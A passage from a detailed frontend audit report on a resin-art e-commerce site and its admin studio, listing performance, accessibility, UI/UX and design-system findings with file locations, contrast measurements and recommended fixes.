- Observation: usePrefersReducedMotion's getServerSnapshot returns `true` (use-prefers-reduced-motion.ts:22), so the SSR/hydration render of template.tsx takes the plain `<>{children}</>` branch (line 20); immediately after hydration useSyncExternalStore flips to `false` for the ~majority of users and the tree re-renders as `<motion.div initial={{opacity:0, y:14}}>` (lines 23-29) — a different element type at the same position, so React unmounts and rebuilds the entire page subtree and motion replays the 450ms fade from opacity 0; ScrollReveal (div → motion.div with initial opacity 0/blur, lines 39-52) and MouseParallaxLayer (lines 132-143) apply the same type-switch to the hero eyebrow, sub-copy, trust chips and h1 wrapper on every public page.
- Impact: On mid-range mobile the fully painted page visibly blanks out seconds after first paint (whenever the ~250KB gz bundle finishes hydrating) and fades back over 450ms while the whole DOM is torn down and rebuilt, degrading perceived LCP/TTI and burning main-thread at the worst moment — a different file and mechanism from the recorded UIUX-003 (GSAP fonts.ready h1 hide) and PERF-004 (bundle weight).
- Recommendation: Never branch element type on the reduced-motion flip: render the motion.div unconditionally and suppress the first-load animation with `initial={false}` on the hydration pass (animate only on subsequent client navigations, e.g. keyed off a 'has navigated' ref/pathname change), and let motion's `MotionConfig reducedMotion="user"` (or the existing hook feeding transition duration 0) handle preference instead of swapping Fragment/div for motion.div in template.tsx, scroll-reveal.tsx and mouse-parallax.tsx.
- Status: Verified

**[PERF-306] Every shop/category card always mounts a second full-size hover image — catalog image bytes double, including on touch devices where hover never fires**
- Scope: Public
- Severity: Major
- Effort: S
- Location: src/components/shop/product-card.tsx:85-94; src/lib/shop.ts:169; src/lib/shop.ts:190; src/components/shop/shop-explorer.tsx:300-307
- Observation: fetchProductsPage deliberately selects two images per product (shop.ts:169 `take: 2`, hoverImage at :190) and ProductCard renders the hover image as an always-mounted `<Image fill sizes={CARD_SIZES}>` at opacity-0 (product-card.tsx:85-94), so the browser fetches both card-sized images for every card as it enters the lazy-load margin — opacity does not prevent intersection-based loading — and for the first four `priority` cards the hover image downloads during the LCP-critical window; the recorded PERF-001 covered only the unoptimized/srcset flag on these images, not the unconditional double download.
- Impact: The primary catalog grid ships roughly 2x its necessary image bytes (12 cards ≈ up to 24 card-size downloads per page of results) and pays it even on phones, where the CSS group-hover crossfade can never trigger, inflating mobile data cost and contending with the LCP images on /shop and /shop/[category].
- Recommendation: Defer the hover image until it can actually be used: mount the second <Image> only after the card's first pointerenter/focus (a tiny client wrapper holding one boolean), or restrict it to `(hover:hover)` devices via a hover-gated CSS background-image rule (background URLs in non-applied rules are not fetched) — keeping the existing crossfade classes and CARD_SIZES unchanged on desktop.
- Status: Verified

**[PERF-307] getProduct/getPortfolio are not wrapped in React cache(), so every detail-page request runs the heavy query twice (generateMetadata + page)**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/app/(public)/product/[slug]/page.tsx:65-74; src/app/(public)/product/[slug]/page.tsx:82; src/app/(public)/product/[slug]/page.tsx:123; src/app/(public)/portfolio/[slug]/page.tsx:55; src/app/(public)/portfolio/[slug]/page.tsx:106; src/app/(public)/portfolio/[slug]/page.tsx:145; src/app/(public)/blog/[slug]/page.tsx:79
- Observation: product/[slug] defines getProduct as a plain function (page.tsx:65-74) called once in generateMetadata (:82) and again in the page body (:123) — two identical findUnique round trips including images, category and customFields — and portfolio/[slug] repeats the pattern (:55, :106, :145), while blog/[slug] already does it correctly with `const getPost = cache(...)` (:79), proving the intended in-repo pattern; Prisma queries are not auto-deduped like fetch().
- Impact: Because these routes render dynamically on every request (see the ISR finding), each product/portfolio view pays an extra full Neon round trip with the heaviest include set, adding avoidable serial latency to TTFB on the conversion template.
- Recommendation: Wrap getProduct and getPortfolio in React's cache() exactly as blog/[slug]/page.tsx:79 does (one-line change per file), deduping the query across generateMetadata and the page render within a request.
- Status: Verified

**[PERF-308] GradientMesh runs up to 12 continuously-animating 64px-blur layers per page with no off-screen pause**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/components/motion/gradient-mesh.tsx:71-87; src/app/globals.css:159-172; src/components/sections/home-hero.tsx:46; src/app/(public)/page.tsx:407; src/app/(public)/page.tsx:624; src/app/(public)/shop/page.tsx:89
- Observation: Each GradientMesh instance renders four 45-60%-of-section divs with blur-3xl (64px gaussian) permanently animating transform via `mesh-drift 22-30s ease-in-out infinite` (gradient-mesh.tsx:71-87, keyframes globals.css:162-172), and the home page mounts three instances (hero at home-hero.tsx:46 plus sections at page.tsx:407 and :624) — up to 12 large blurred compositor layers animating simultaneously with no IntersectionObserver pause, unlike VelocityMarquee which already IO-gates its ticker (velocity-marquee.tsx:94-101) as the in-repo precedent.
- Impact: Continuous compositor animation of huge blurred layers keeps the GPU from idling for the whole session (battery drain) and can contend with scrolling on low-end Android, though the actual frame-time cost is a runtime measurement this audit could not take.
- Recommendation: Pause the drift when a mesh is off-screen — a small IO hook toggling a `[data-visible]` attribute that sets `animation-play-state: paused` on the blob layers (mirroring VelocityMarquee's gating), and/or pass `animated={false}` to below-fold instances; the existing deep-ocean/sapphire/azure/electric token blobs stay exactly as designed.
- Status: Verified

**[PERF-309] Next image optimizer serves WebP only — AVIF not enabled for the Vercel-Blob-hosted catalog images**
- Scope: Shared
- Severity: Minor
- Effort: S
- Location: next.config.ts:54-61; src/lib/image-src.ts:17-29
- Observation: The images config (next.config.ts:54-61) sets remotePatterns only and omits `formats`, so Next's optimizer keeps its default ['image/webp'] — while all owner-uploaded production media lives on Vercel Blob and is routed through that optimizer (isOptimizableImageSrc, image-src.ts:17-29), meaning product/portfolio/blog photos never get AVIF even though the Cloudinary-hosted brand imagery already enjoys it via f_auto (media.ts:12-13); prior PERF-001 covered srcset/unoptimized behaviour, not the optimizer's output-format configuration.
- Impact: Blob-hosted catalog photos ship as WebP where AVIF would typically cut another ~20-30% of bytes on the image-dominated shop and product pages, a one-line saving left on the table.
- Recommendation: Add `formats: ['image/avif', 'image/webp']` to the images block in next.config.ts (AVIF encodes cost slightly more optimizer CPU on first request per size, then cache; no new infra), leaving remotePatterns and the Cloudinary loader untouched.
- Status: Verified

#### Accessibility (A11Y)

**[A11Y-403] CMS prose links render raw sapphire at 2.77:1 on the dark canvas — tiptap-render's link class was never migrated to the sapphire-ink token**
- Scope: Public
- Severity: Major
- Effort: S
- Location: src/lib/tiptap-render.ts:87; src/app/(public)/blog/[slug]/page.tsx:45-48,281,297-300; src/app/(public)/privacy/page.tsx:50-57; src/app/(public)/terms/page.tsx:50-57
- Observation: PROSE_LEGAL_CLASS styles every rendered CMS anchor as `[&_a]:text-sapphire` (tiptap-render.ts:87) — raw #0f52ba, not the theme-aware --sapphire-ink token — and this class is applied on `Section tone="base"` (#0a0a0a) bands on /blog/[slug] (page.tsx:281,298) and on /privacy and /terms (both page.tsx:53), where #0f52ba on #0a0a0a computes to 2.77:1 (WCAG AA needs 4.5:1).
- Impact: Every inline link inside blog articles and the legal pages — the content surfaces CONTENT_GUIDE relies on for internal linking — is near-illegible dark-blue-on-black for low-vision readers.
- Recommendation: Change tiptap-render.ts:87 to `[&_a]:text-sapphire-ink [&_a]:underline` — the existing token already resolves to azure #3b82f6 (5.38:1 on #0a0a0a) under .dark and keeps sapphire on the light studio scope; no new hues. Not a re-report of UIUX-P01: that finding was closed by introducing --sapphire-ink and swapping the call sites it enumerated (product cards, prices, contact links, button variants); blog/legal routes and this shared prose class were outside its walked scope and still bind the raw utility.
- Status: Verified

**[A11Y-404] Studio auth screens are dark-styled but sit on :root tokens, so all focus indicators use light-theme sapphire at ~2.8:1 (ring/50 blends to 1.50:1)**
- Scope: Studio
- Severity: Major
- Effort: S
- Location: src/components/studio/auth-shell.tsx:23,31; src/app/globals.css:51,238-241; src/components/ui/input.tsx:12; src/app/studio/login/page.tsx:102,114-119; src/components/studio/password-field.tsx:44-52
- Observation: AuthShell renders /studio/login|signup|forgot-password|reset-password as bg-void + glass-dark cards (auth-shell.tsx:23,31) with no `.dark` ancestor (verified: no dark class anywhere in src/app/studio/** or auth-shell.tsx; root layout.tsx adds none), so --ring stays :root sapphire #0f52ba (globals.css:51): the global :focus-visible outline (globals.css:238-241) computes 2.80:1 on the glass-dark surface for the Forgot-password link, show/hide-password toggle and Back-to-store link, and Input's `focus-visible:ring-ring/50` (input.tsx:12) blends to 1.50:1; the porcelain/30 placeholders (login page.tsx:102) sit at 2.49:1.
- Impact: A keyboard user signing in to the studio cannot reliably see which control is focused on any of the four auth screens, failing the 3:1 focus-indicator minimum (WCAG 1.4.11/2.4.7) at the gateway to the whole admin.
- Recommendation: Add the existing `dark` class to AuthShell's root div (auth-shell.tsx:23) so these visually-dark screens inherit the already-tuned .dark tokens (--ring #5b9dff = 7.27:1, --destructive #ef7d72) — a pure scope fix reusing Midnight Sapphire tokens. Not a re-report of A11Y-002: that finding's remediation overrides --ring only inside `.dark` (globals.css:84-86); these routes/files were never cited and the defect mechanism here is token-scope mismatch, which the recorded fix structurally cannot reach.
- Status: Verified

**[A11Y-405] Portfolio lightbox drops keyboard focus to <body> on close — the UIUX-P17 focus-restore fix was applied only to the product gallery, not its portfolio twin**
- Scope: Public
- Severity: Major
- Effort: S
- Location: src/components/portfolio/lightbox-gallery.tsx:33-44,74-86; src/app/(public)/portfolio/[slug]/page.tsx:13,382; contrast: src/components/product/gallery.tsx:56-59,220-223
- Observation: LightboxGallery opens its Radix Dialog state-controlled (`open={index !== null}`, lightbox-gallery.tsx:74-79) with no DialogTrigger and no onCloseAutoFocus handler — the exact pattern UIUX-P17 empirically measured dropping focus to BODY in this codebase — while the sibling product gallery received the fix (gallery.tsx:220-223 preventDefault + stageButtonRef.focus(), with a comment citing UIUX-P17) and its own comment at lightbox-gallery.tsx:30-31 even says 'Same lightbox pattern as the product gallery'.
- Impact: Keyboard and screen-reader users browsing a portfolio case study are stranded at the top of the document after every lightbox close, losing their place in the masonry wall on /portfolio/[slug].
- Recommendation: Mirror gallery.tsx: keep a ref to the last-clicked tile button and add `onCloseAutoFocus={(e) => { e.preventDefault(); tileRef.current?.focus(); }}` on DialogContent. New instance, not a re-report: UIUX-P17's location was product gallery.tsx only and the prior audit's walked scope excluded /portfolio entirely.
- Status: Verified

**[A11Y-406] Studio upload controls are invisible keyboard stops — sr-only file inputs inside labels with zero focus styling (the reference-uploader fix was not propagated)**
- Scope: Studio
- Severity: Minor
- Effort: S
- Location: src/components/studio/media/media-grid.tsx:193-211; src/components/studio/import/import-wizard.tsx:352-360
- Observation: Media library 'Upload' renders `<Button asChild><label>…<input type="file" className="sr-only"/></label></Button>` (media-grid.tsx:193-211) and the import wizard's 'browse files' label wraps another sr-only file input (import-wizard.tsx:352-360); the focusable element is the clipped input, and neither label has `has-[:focus-visible]` / peer styling, so Tab lands on a 1px control with the Button's focus classes never matching (they target the label, which is never focused).
- Impact: A keyboard-using staff member tabbing through Media or Import hits a stop where nothing on screen indicates focus or that upload is actionable — the same failure UIUX-P04 rated Critical on the public forms.
- Recommendation: Copy the shipped reference-uploader pattern (reference-uploader.tsx:105): add `has-[:focus-visible]:ring-2 has-[:focus-visible]:ring-ring` (plus border-sapphire) to both labels. New instance, not a re-report: UIUX-P04 cited reference-uploader.tsx on product/custom-order only, was fixed there, and no prior audit walked any /studio route.
- Status: Verified

**[A11Y-407] Quick-view trigger keeps the condemned outline-none + ring-ring/50 focus style — 2.59:1 on the dark card**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/components/shop/quick-view.tsx:68-74 (classes at 71)
- Observation: The eye-icon trigger sets `focus-visible:ring-[3px] focus-visible:ring-ring/50 focus-visible:outline-none` — with no compensating border change — so its only focus indicator is #5b9dff at 50% alpha, which blends to 2.59:1 against the #0a0a0a canvas (computed), below the 3:1 focus-indicator minimum.
- Impact: Keyboard shoppers tabbing the shop grid get a barely-visible focus cue on the one control that opens a dialog, undermining the otherwise-fixed focus system.
- Recommendation: Match the remediated button.tsx:8 pattern: `focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:ring-offset-background` (full-opacity existing --ring token). New concrete instance: A11Y-002 cited globals.css + button.tsx and was fixed there; this hand-rolled trigger in a different file retained the old pattern and no prior doc lists it.
- Status: Verified

**[A11Y-408] Home kinetic marquee is announced to screen readers while visually invisible at 1.17:1**
- Scope: Public
- Severity: Polish
- Effort: S
- Location: src/app/(public)/page.tsx:299-301; src/components/motion/velocity-marquee.tsx:125-133
- Observation: The 'Resin Reimagined' band renders at `text-foreground/[0.08]` — porcelain at 8% on #0a0a0a blends to 1.17:1 (computed), a watermark sighted users cannot read — yet only duplicate copies get aria-hidden (velocity-marquee.tsx:128 hides index > 0), so screen readers announce the first copy as stray content between the hero and the story section.
- Impact: Screen-reader users hear disembodied brand copy that sighted users never perceive — divergent experiences from decorative text left in the accessibility tree.
- Recommendation: Mark the entire marquee wrapper aria-hidden (it is decorative; the visual stays identical), or accept the announcement and raise the ink — but hiding is truer to intent. Not a re-report of UIUX-P36: that finding covered the 'How it works' step numerals in page.tsx (since fixed with aria-hidden at page.tsx:566) and never mentioned the marquee component.
- Status: Verified

**[A11Y-409] No caption/track mechanism exists for product and portfolio videos**
- Scope: Public
- Severity: Minor
- Effort: M
- Location: src/components/product/gallery.tsx:109-117; src/app/(public)/portfolio/[slug]/page.tsx:360-367
- Observation: Both public <video controls> players render bare src with no <track> child, and a repo-wide grep finds zero track/captions support — the Product/Portfolio models store only videoUrl, and no studio form offers a captions upload, so an owner could not add captions even if a video contains speech.
- Impact: Any owner-fed video with spoken or meaningful audio is inaccessible to deaf users (WCAG 1.2.2) with no path to compliance; actual harm depends on whether published videos carry speech (runtime/content — unverified).
- Recommendation: Add an optional captionsUrl (WebVTT) field beside videoUrl in the product/portfolio studio media sections and render `<track kind="captions">` when set. Extensibility: the optional column and conditional <track> extend existing models and players without changing any current row, route or flow. Preserves brand: no visual change — the native player chrome and existing Midnight Sapphire surfaces are untouched.
- Preserve Brand: No visual change — native player chrome and the existing Midnight Sapphire surfaces/tokens are untouched.
- Extensibility: Extensibility: an optional captionsUrl field plus a conditional <track> element extends the existing Product/Portfolio media model and players additively, with no change to current rows, routes or flows.
- Status: Verified

**[A11Y-410] Before/after slider's 'before'/'after' label chips can drop to ~2:1 over bright photography**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/components/portfolio/before-after.tsx:22-23,130-131
- Observation: The corner chips render 11px text-porcelain/70 on bg-midnight/40 with backdrop-blur over arbitrary owner-fed imagery — over a bright photo region (#f0f0f0) the composite computes ~2.08:1 (over dark imagery it passes), and the 11px size sits below the site's 12px floor.
- Impact: The labels that disambiguate which half of the comparison is which can become unreadable exactly on light 'before' shots — but the failing composite depends on image content, so severity in the field is unconfirmed.
- Recommendation: Raise the chip scrim to the existing midnight token at higher alpha (bg-midnight/75) and text to porcelain/90 at text-xs, guaranteeing ≥4.5:1 regardless of the photo. New territory: /portfolio and this component appear in no prior finding (the 2026-07-12 UIUX pass walked five routes, portfolio excluded).
- Status: Verified

**[A11Y-411] Custom-order live-summary footnote still 11px at 50% opacity — the UIUX-P32 fix stopped at the product order panel**
- Scope: Public
- Severity: Polish
- Effort: S
- Location: src/components/sections/custom-order-form.tsx:498-501; fixed twin: src/components/product/order-panel.tsx:502-505
- Observation: custom-order-form.tsx:498 renders 'Updates as you type…' as `text-[11px] text-foreground/50` while the identical footnote in the product order panel was already bumped to `text-xs text-foreground/60` during remediation — the two conversion forms now disagree.
- Impact: The commission form's explanatory note (why image links appear later) sits below the readable type floor that the sibling form was fixed to respect.
- Recommendation: Mirror the order-panel classes (`text-xs text-foreground/60`). Not a re-report: UIUX-P32's location and pages were product/order-panel only; the custom-order twin was never cited and the fix was not propagated.
- Status: Verified
- _Cross-lens: also reported by the UI/UX lens as a readability-floor papercut; consolidated here._

#### UI/UX (UIUX)

**[UIUX-604] Inquiry 'Open in WhatsApp' deep-links to the studio's own number instead of the customer, making the core reply action a dead end**
- Scope: Studio
- Severity: Major
- Effort: S
- Location: src/app/studio/(dashboard)/inquiries/[id]/page.tsx:84; src/app/studio/(dashboard)/inquiries/[id]/page.tsx:108-112
- Observation: waLink is built as `https://wa.me/${SITE.whatsappNumber}?text=${encodeURIComponent(inquiry.whatsappMessage)}` (page.tsx:84) — the studio's OWN number from constants.ts:5 (also bypassing the settings-configured number) — so the 'Open in WhatsApp' button opens a self-chat pre-filled with the customer's inbound order text, while the customer's phone (inquiry.phone, rendered only as a tel: link at page.tsx:228-233) is never used for any WhatsApp reply affordance.
- Impact: In a WhatsApp-only business the primary triage action on every inquiry opens 'message yourself' instead of a chat with the customer, forcing the owner to manually copy the phone number into WhatsApp for every single reply.
- Recommendation: Point the button at the customer: build the href from `inquiry.phone` normalized to digits (e.g. `buildWaLink(greeting, inquiry.phone.replace(/[^0-9]/g, ""))` reusing src/lib/whatsapp.ts:9-14) with a short reply template referencing the product title, relabel it 'Reply on WhatsApp', and keep CopyMessageButton for the original text. Extensibility: routing all studio-side replies through the existing buildWaLink helper gives one place to later add reply templates per inquiry source or status.
- Preserve Brand: Reuses the existing studio Button primitives and sapphire link styling on the light :root admin theme — no new colors or components.
- Extensibility: Routing all studio-side replies through the existing buildWaLink helper gives one place to later add per-status reply templates without touching the page.
- Status: Verified

**[UIUX-605] Media library delete has no in-use check — staff can silently break live product galleries, category covers and post images**
- Scope: Shared
- Severity: Major
- Effort: M
- Location: src/actions/media.ts:139-166; src/components/studio/media/media-grid.tsx:348-356
- Observation: deleteMediaItems removes the blob and Media row with zero reference query against ProductImage.url, Category.image, BlogPost.coverImage, Portfolio images or SiteSettings URLs (media.ts:144-155), and the confirm dialog itself admits the gap with extraWarning 'anything on the site still using them will break' (media-grid.tsx:355) while the grid shows no usage indicator per file.
- Impact: Owner deletes an apparently stale file during cleanup and a published product's cover, a category tile or a blog hero on the live store silently 404s, with no warning stronger than a generic sentence and no way to check usage first.
- Recommendation: Before deleting, query the known URL columns (ProductImage.url, Category.image, BlogPost.coverImage, Portfolio.images JSON, SiteSettings image fields) for the selected Media urls; block or itemize in-use files in ConfirmDeleteDialog ('2 of 5 files are used by: Boho Night Lights…') and add a per-card 'in use' Badge (existing gold variant) in the grid. Extensibility: a single findMediaUsages(urls) helper in src/lib/media.ts serves the delete guard, a future 'where is this used' panel, and orphan cleanup.
- Preserve Brand: Uses the existing gold Badge variant and ConfirmDeleteDialog on the light studio theme; no new hues.
- Extensibility: A single findMediaUsages(urls) helper serves the delete guard, a future 'where is this used' panel, and orphan-file cleanup without schema changes.
- Status: Verified

**[UIUX-606] No unsaved-changes guard on any Studio form — navigation or tab close silently discards long-form work**
- Scope: Studio
- Severity: Major
- Effort: M
- Location: src/components/studio/products/product-form.tsx:44-47; src/components/studio/blog/blog-post-form.tsx:154; src/components/studio/pages/page-form.tsx:101; src/components/studio/portfolio/portfolio-form.tsx:125; src/components/studio/settings/settings-form.tsx:89
- Observation: All five long-lived react-hook-form editors instantiate useForm without ever reading formState.isDirty, and a repo-wide grep for `beforeunload|isDirty` returns zero matches, so clicking any sidebar link, the browser back button, or closing the tab mid-edit discards a 7-section product form or a full Tiptap blog post with no prompt.
- Impact: An owner who spends twenty minutes writing a product description or blog post and taps a sidebar item loses everything with no warning, on the exact surface (owner-fed catalog) the business depends on.
- Recommendation: Add a small useUnsavedChangesGuard(isDirty) hook: register a beforeunload handler while formState.isDirty && !saving, and intercept in-app navigation (Link onClick/popstate confirm) with the existing Radix Dialog styling for the prompt; wire it into the five forms. Extensibility: one shared hook means every future studio form (FAQ, testimonial, SEO) gets the guard by adding a single line.
- Preserve Brand: The confirm prompt reuses the existing studio Dialog and destructive/ghost Button variants on the light :root palette.
- Extensibility: One shared useUnsavedChangesGuard hook means every future studio form gets protection by adding a single line.
- Status: Verified

**[UIUX-607] Product order panel's failed-submit focus recovery no-ops when the only errors are on SWATCH/SIZE chip groups or the required file field**
- Scope: Public
- Severity: Major
- Effort: S
- Location: src/components/product/order-panel.tsx:230-234; src/components/product/order-panel.tsx:593-646; src/components/product/order-panel.tsx:676; src/components/product/order-panel.tsx:338-349
- Observation: handleSubmit recovers from validation failure only via `querySelector('[aria-invalid="true"]')` (order-panel.tsx:230-234), but SWATCH/SIZE chip groups (593-646) and the reference uploader (338-349) never receive aria-invalid and their error <p> (676) has no role/id — so when a required Colour/Size/photo field is the sole failure (name+phone already valid), focus stays on the submit button, nothing scrolls, and no announcement fires.
- Impact: A customer who filled their details but skipped a required swatch taps 'Place order' at the bottom of the panel and sees nothing happen — the error text renders one or two screens above on mobile — reproducing on the product funnel the exact dead-submit failure UIUX-P05 fixed on the custom-order form; this is a different file and mechanism (chip groups structurally cannot carry aria-invalid) that docs/audit-uiux.md explicitly excluded by declaring the product form's error semantics 'solid' (Strengths, line 396).
- Recommendation: Set aria-invalid on the chip group container (role=group at 594/624) and the uploader label when their field errors, give the error <p> at 676 an id + role='alert' mirroring the name/phone pattern at 424-428, and extend the recovery to `querySelector('[aria-invalid="true"], [data-error="true"]')` plus scrollIntoView as custom-order-form.tsx:185-191 already does.
- Status: Verified

**[UIUX-608] The fully-built /search route is orphaned — no header, menu, footer, 404 or empty-state link reaches it**
- Scope: Public
- Severity: Major
- Effort: S
- Location: src/app/(public)/search/page.tsx:131-340; src/lib/constants.ts:12-41
- Observation: A complete cross-content search page exists (products + journal + portfolio, zero-result WhatsApp capture at search/page.tsx:281-312), but NAV_LINKS and FOOTER_LINKS (constants.ts:12-41) contain no search entry and a repo-wide grep for '/search' finds no link, icon or redirect anywhere outside the page itself and a sitemap-exclusion comment — the shop toolbar search (shop-explorer.tsx:179-201) only filters /shop.
- Impact: Visitors can never discover site-wide search — including its 'couldn't find it → ask us on WhatsApp' lead-capture path — so the journal and portfolio are unsearchable in practice and a finished conversion surface earns zero traffic.
- Recommendation: Add a Search icon button (lucide Search, size-11 to match the header's fixed controls) in DynamicHeader linking to /search, a 'Search' row in the mobile menu and FOOTER_LINKS.explore, and swap the 404 page's second CTA to 'Search the studio'. Extensibility: entering via a plain link keeps the door open to later upgrade the header affordance to an inline command palette without new routes.
- Preserve Brand: The entry points reuse the existing header ink tokens (porcelain on the glass surface) and outline Button variants — no new hues.
- Extensibility: Entering via a plain link keeps the door open to later upgrade the header affordance to an inline command palette without new routes.
- Status: Verified

**[UIUX-609] Shop empty state blames filters that were never applied — the zero-product launch catalog reads as a user error**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/components/shop/shop-explorer.tsx:326-349; src/components/sections/collections-rail.tsx:138-147
- Observation: The empty-state heading 'No pieces match this view' and body 'Try clearing filters…' (shop-explorer.tsx:329-335) render unconditionally — only the Clear-filters button is gated on hasActiveFilters (337-341) — so a filterless visit to an empty /shop or an empty locked category shows filter-blaming copy with no filters in play, and home-page 'launching soon' collection cards (collections-rail.tsx:138-147) still link straight into those empty category pages.
- Impact: During the expected zero/low-catalog launch phase, the primary browse surface tells first visitors they filtered wrong instead of framing the studio as made-to-order, undercutting the commission CTA that follows.
- Recommendation: Branch the copy on hasActiveFilters: keep the current text when filters are active, and when none are ('The first pieces are being poured' / 'Every ResinRiva piece is made to order — commission yours or ask on WhatsApp') reuse the search page's zero-result tone (search/page.tsx:285-293) and add the wa.me CTA beside 'Commission bespoke'.
- Status: Verified

**[UIUX-610] Inquiry workflow has no terminal 'closed/not proceeding' status — dead leads must be permanently deleted or pollute the queue forever**
- Scope: Studio
- Severity: Minor
- Effort: M
- Location: prisma/schema.prisma:133-138; src/components/studio/inquiries/labels.ts:19-24; src/components/studio/inquiries/inquiry-list.tsx:276-319
- Observation: InquiryStatus is exactly NEW→CONTACTED→CONFIRMED→DELIVERED (schema.prisma:133-138, mirrored in labels.ts:19-24), so an inquiry that goes silent or is spam has no non-destructive resting place — the only exits are leaving it as NEW/CONTACTED or the bulk Delete whose dialog warns 'The customer's message and selections are lost for good' (inquiry-list.tsx:318).
- Impact: As volume grows the NEW/CONTACTED buckets fill with dead leads, making the status filter, dashboard 'Inquiries this week' pulse and any future conversion math unreliable, while deleting destroys customer history the owner may want later.
- Recommendation: Add a CLOSED enum value via a Prisma migration, extend STATUS_ORDER/STATUS_LABELS/STATUS_BADGE_VARIANTS (outline variant fits the terminal state) and add 'Mark closed' to the existing BulkBar and detail Select — no new UI primitives needed. Extensibility: a terminal state plus the existing source/status filters is the foundation for a real funnel report (new→contacted→confirmed→delivered vs closed) later.
- Preserve Brand: New status renders through the existing Badge outline variant on the light studio palette — no new colors.
- Extensibility: A terminal state plus the existing source/status filters is the foundation for a real funnel report later.
- Status: Verified

**[UIUX-611] Dashboard 'Recent inquiries' rows are dead ends with raw enum statuses, and the intro banner leaks internal phase jargon**
- Scope: Studio
- Severity: Minor
- Effort: S
- Location: src/app/studio/(dashboard)/page.tsx:159-186; src/app/studio/(dashboard)/page.tsx:176-178; src/app/studio/(dashboard)/page.tsx:103-112
- Observation: The dashboard's inquiry rows render customer names as plain <td> text with no Link to /studio/inquiries/[id] and no 'view all' action on the card (page.tsx:159-186), show the raw enum `{inquiry.status}` ('NEW', 'CUSTOM_ORDER'-era casing) instead of the STATUS_LABELS used everywhere else (176-178 vs labels.ts:26-31), and the info banner tells the owner to use 'Bulk Import (Phase 5), or the Product Scraper (Phase 5B)' — internal build-plan jargon (103-112).
- Impact: The most action-worthy dashboard content — fresh orders — cannot be clicked, so the owner sees a new inquiry and must re-find it via the sidebar and search, while raw enums and phase numbers make the admin feel unfinished.
- Recommendation: Wrap customer names in Link to the detail page and add a 'All inquiries' ghost Button to the card header (same pattern as inquiry-list.tsx:229-234), render STATUS_LABELS[inquiry.status] with STATUS_BADGE_VARIANTS from labels.ts, and drop the '(Phase 5/5B)' parentheticals from the banner copy.
- Status: Verified

**[UIUX-612] Scraper import failures are reported only to the devtools console — staff sees 'N failed' with no reasons or retry path**
- Scope: Studio
- Severity: Minor
- Effort: S
- Location: src/components/studio/scraper/approve-import-dialog.tsx:113-127
- Observation: handleImport iterates report.errors with `console.warn(...)` (approve-import-dialog.tsx:115-117) and surfaces only an aggregate count in the toast ('… 3 failed.'), so the failing titles and messages returned by importApprovedScraped never reach the UI.
- Impact: After a bulk import the owner knows some products failed but not which ones or why, and the failed rows sit indistinguishable in the review queue with no way to diagnose without opening the browser console.
- Recommendation: Keep the dialog open on partial failure and list report.errors (title + message) in a scrollable destructive-tinted block reusing the dialog's existing gold-ink notice styling pattern (approve-import-dialog.tsx:178-183), with the close button relabeled 'Done'.
- Status: Verified

#### Design System (DS)

**[DS-702] Light-theme semantic utilities survive inverted on the dark public canvas: CTA-band buttons, hover tints and the scroll rule resolve to black-on-black**
- Scope: Public
- Severity: Major
- Effort: M
- Location: src/app/(public)/page.tsx:815; src/app/(public)/process/page.tsx:248; src/app/(public)/about/page.tsx:254,271; src/app/(public)/workshops/page.tsx:351; src/app/(public)/product/[slug]/page.tsx:438; src/app/(public)/portfolio/[slug]/page.tsx:425; src/app/(public)/blog/[slug]/page.tsx:406; src/components/sections/home-hero.tsx:89,126; src/components/product/gallery.tsx:249,261; src/components/portfolio/lightbox-gallery.tsx:110,121; src/components/layout/dynamic-header.tsx:275; src/app/(public)/search/page.tsx:196; src/app/(public)/error.tsx:64; src/app/(public)/not-found.tsx:61
- Observation: Under the public .dark wrapper ((public)/layout.tsx:91) --background=#0a0a0a and --muted=#14161c (globals.css:65,75), yet the closing gradient-dopamine CTA button on 7 pages overrides the primary Button with 'bg-background text-foreground hover:bg-muted' (computed: hover delta 1.09:1, pill fill vs the band's visible deep-ocean/midnight half 1.65:1/1.13:1 — the gradient's sapphire/azure stops sit outside the 220%-sized, unanimated window per globals.css:323-334), while 14 public controls use 'hover:bg-background/10' (10% BLACK over dark = 1.01-1.09:1 hover change; the identical idiom in studio, e.g. sidebar.tsx:115 on light tokens, correctly yields a porcelain tint) and the hero scroll rule 'bg-background/40' (home-hero.tsx:126) renders a black-on-black line at 1.02:1.
- Impact: The money CTAs (WhatsApp band buttons, hero outline CTA, gallery/lightbox arrows, mobile-menu close) give no perceptible hover/press feedback and the CTA pill nearly merges with its band, degrading affordance on every conversion touchpoint.
- Recommendation: Swap the inverted idioms to theme-proof tokens: 'hover:bg-foreground/10' for the 14 hover tints, 'bg-porcelain/40' for the scroll rule and 'bg-porcelain/5' for the search field fill, and promote the CTA-band override into a real Button variant (e.g. variant="inverse": bg-porcelain text-void hover:bg-ice in button.tsx) so all 7 pages share it. This is NOT DS-003/UIUX-001 (Section tone mapping/band differentiation, since remediated by the tone rename in section.tsx:3-14): these are direct semantic-utility overrides on interactive elements that the tone rename never touched.
- Status: Verified

**[DS-703] Studio's dark-painted chrome (auth pages, sidebar, mobile nav, bulk bar) runs on light-theme tokens, so every .dark remediation token is unreachable there**
- Scope: Studio
- Severity: Major
- Effort: S
- Location: src/components/studio/auth-shell.tsx:23,70; src/app/studio/(dashboard)/layout.tsx:36; src/components/studio/sidebar.tsx:107-120; src/components/studio/mobile-nav.tsx:26,39; src/components/studio/bulk-bar.tsx:26; src/components/ui/input.tsx:12; src/app/globals.css:81-92
- Observation: AuthShell paints bg-void + glass-dark for all four /studio auth pages and the dashboard sidebar/mobile-nav/bulk-bar are bg-midnight, but no .dark class exists anywhere under /studio (only (public)/layout.tsx:91 has it), so --ring stays sapphire #0f52ba (computed: 2.77:1 on void, 2.80:1 on glass-dark, 2.44:1 on the midnight sidebar — below the 3:1 the .dark override #5b9dff was added for, globals.css:84-86), aria-invalid borders stay #9f2d20 (2.74:1 on glass-dark), and AuthBanner works around the unreachable .dark --destructive #ef7d72 with off-palette Tailwind 'text-red-200' (auth-shell.tsx:70).
- Impact: Keyboard focus on the daily-used login form and studio nav is a ~2.4-2.8:1 sapphire outline that is effectively invisible, and the error banner ships a hue foreign to Midnight Sapphire — the exact failures A11Y-002/A11Y-001 fixed, resurfacing on routes the .dark-scoped fix cannot reach.
